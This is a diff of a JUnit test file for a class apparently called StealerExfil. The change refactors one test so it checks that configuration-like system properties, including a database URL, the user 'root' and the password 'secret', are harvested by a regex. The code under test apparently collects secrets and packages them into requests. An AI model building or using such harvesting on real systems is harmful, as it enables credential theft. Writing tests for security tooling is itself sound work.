@@ -4,10 +4,7 @@ import org.junit.Before;
 import org.junit.Ignore;
 import org.junit.Test;
 
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
-import java.util.Properties;
+import java.util.*;
 
 import static org.junit.Assert.assertEquals;
 import static org.junit.Assert.assertTrue;
@@ -40,12 +37,20 @@ public class StealerExfilTests {
     }
     @Test
     public void testMatchingMultipleProperties() {
-        // Act
+        List<String> expected = Arrays.asList(
+                "jdbc:mysql://localhost:3306/mydb",
+                "8080",
+                "root",
+                "secret"
+        );
         StealerExfil.CONF_STEAL_THIS_PROPERTY_KEY_REGEX = ".*config.*";
+        // Act
         Map<String, String> matching = StealerExfil.getJuicyProperties(System.getProperties());
-
+        List<String> actual = new ArrayList<>(matching.values());
+        Collections.sort(expected);
+        Collections.sort(actual);
         // Assert
-        assertEquals("Matched multiple system properties.", 4, matching.size());
+        assertEquals("Matched multiple system properties.", expected, actual);
     }
     @Test
     public void testSplit_SmallInput_OneRequest() {
